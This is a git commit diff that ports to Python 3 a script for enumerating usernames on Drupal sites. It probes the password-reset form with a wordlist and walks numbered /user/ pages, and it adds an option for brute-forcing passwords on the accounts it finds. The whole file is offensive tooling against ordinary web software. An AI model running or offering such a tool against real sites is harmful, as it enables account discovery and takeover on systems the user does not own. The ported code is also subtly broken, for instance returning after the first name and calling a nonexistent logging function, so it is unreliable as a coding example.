67403167f8d3b4ecc77a103d5ecc79c17f68ce83
Jens Timmerman <jens.timmerman@gmail.com>
2018-08-13 10:46:38 +0200

    code cleanup, port to python3

--- enum-users.py
+++ enum-users.py
@@ -9,74 +9,88 @@ from bs4 import BeautifulSoup
 import sys
 from optparse import OptionParser
 import re
+import logging
 
-VERBOSE_MODE = False
+
+def wordlist(options):
+    # url to target
+    url = "%s/user/password" % options.url
+
+    # load the usernames to enumerate
+    with open(options.wordlist) as f:
+        usernames = f.readlines()
+
+    found = []
+
+    for username in usernames:
+        username = username.rstrip()
+        logging.debug("Trying %s", username)
+        # get form id
+        req = requests.get(url)
+        soup = BeautifulSoup(req.content)
+        # get form
+        form = soup.find('form', attrs={'id': 'user-pass'})
+        form_build_id = form.find('input', attrs={'name': 'form_build_id'})['value']
+        form_id = form.find('input', attrs={'name': 'form_id'})['value']
+        op = form.find('input', attrs={'name': 'op'})['value']
+        # send request
+        data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username}
+        req = requests.post(url, data=data)
+        if ('is not recognized as a user name or an e-mail address.' in req.content):
+            logging.debug("Username '%s' does not exist", username)
+        else:
+            print("[!] Username '%s' exists" % username)
+            found.append(username)
+        return found
+
+def auto(options):
+    # url to target
+    url = "%s/user/" % options.url
+
+    found = []
+    for i in range(1, 1000):
+        tmp_url = "%s%s" % (url, i)
+        logging.debug("Trying '%s'", tmp_url)
+        req = requests.get(tmp_url)
+
+        username = re.search(r"/users/([a-zA-Z0-9-/.!?]+)", str(req.content))
+        if username:
+            print("[!] Username '%s' found" % username.group(1))
+            found.append(username.group(1))
+    return found
 
 
-def display_message(s):
-    global VERBOSE_MODE
-    if VERBOSE_MODE:
-        print '[verbose] %s' % s
+def brute(pwlist, usernamelist):
+    pass
 
 
 def main():
-    global VERBOSE_MODE
     parser = OptionParser()
     parser.add_option("-u", "--url", dest="url", help="URL of the Drupal install", default=None)
-    parser.add_option("-w", "--wordlist", dest="wordlist", help="wordlist you want to try", default=None)
-    parser.add_option("-a", "--auto", action="store_true", dest="auto", help="Automatic method to enumerate users", default=None)
+    parser.add_option("-n", "--namelist", dest="wordlist", help="list of usernames you want to try", default=None)
+    parser.add_option("-p", "--pwlist", dest="pwlist", help="list of passwords you want to try with bruteforce on found
+                      users", default=None)
+    parser.add_option("-a", "--auto", action="store_true", dest="auto", help="Automatic method to enumerate users",
+                      default=None)
     parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Verbose mode")
 
-    (options, args) = parser.parse_args()
+    options, _ = parser.parse_args()
 
     if options.verbose:
-        VERBOSE_MODE = True
+        logging.setloglevel(logging.DEBUG)
 
     if not options.url or (not options.wordlist and not options.auto):
-        print parser.print_help()
+        print(parser.print_help())
         sys.exit(-1)
 
-    if (options.wordlist):
-        # url to target
-        url = "%s/user/password" % options.url
+    found = []
+    if options.wordlist:
+        found.append(wordlist(options))
+    if options.auto:
+        found.append(auto(options))
+    if options.pwlist:
+        brute(options.pwlist, found)
 
-        # load the usernames to enumerate
-        with open(options.wordlist) as f:
-            usernames = f.readlines()
-
-        for username in usernames:
-            username = username.rstrip()
-            display_message("Trying %s" % username)
-            # get form id
-            req = requests.get(url)
-            soup = BeautifulSoup(req.content)
-            # get form
-            form = soup.find('form', attrs={'id': 'user-pass'})
-            form_build_id = form.find('input', attrs={'name': 'form_build_id'})['value']
-            form_id = form.find('input', attrs={'name': 'form_id'})['value']
-            op = form.find('input', attrs={'name': 'op'})['value']
-            # send request
-            data = {'form_build_id': form_build_id, 'form_id': form_id, 'op': op, 'name': username}
-            req = requests.post(url, data=data)
-            if ('is not recognized as a user name or an e-mail address.' in req.content):
-                display_message("Username '%s' does not exist" % username)
-            else:
-                print "[!] Username '%s' exists" % username
-
-    if (options.auto):
-        # url to target
-        url = "%s/user/" % options.url
-
-        for i in range(1, 1000):
-            tmp_url = "%s%s" % (url, i)
-            display_message("Trying '%s'" % tmp_url)
-            req = requests.get(tmp_url)
-
-            try:
-                username = re.search(r"/users/([a-zA-Z0-9-/.!?]+)", req.content).group(1)
-                print "[!] Username '%s' found" % username
-            except:
-                pass
 
 if __name__ == '__main__':
     main()
